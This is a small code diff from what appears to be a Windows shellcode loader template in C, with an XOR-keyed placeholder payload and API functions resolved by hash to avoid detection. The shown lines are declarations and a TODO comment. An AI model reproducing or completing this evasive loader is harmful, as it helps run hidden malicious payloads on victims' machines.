@@ -4,12 +4,16 @@
 int WinMainCRTStartup() {
     unsigned char payload[] = "%SHELLCODE%";
     WORD key = %XOR_KEY%;
-    
+
     SIZE_T regionSize = sizeof(payload);
     PVOID exec = NULL;
     DWORD old_protect = 0;
     HANDLE th;
     BOOL rv;
+
+    /* TAGS todo
+    FunctionHASH__functionNAME
+    */
 
     unsigned int ndtll_hash = 0x69e00346;   // ROL17
     unsigned int virtual_alloc_hash = 0x96124679; // ROR23
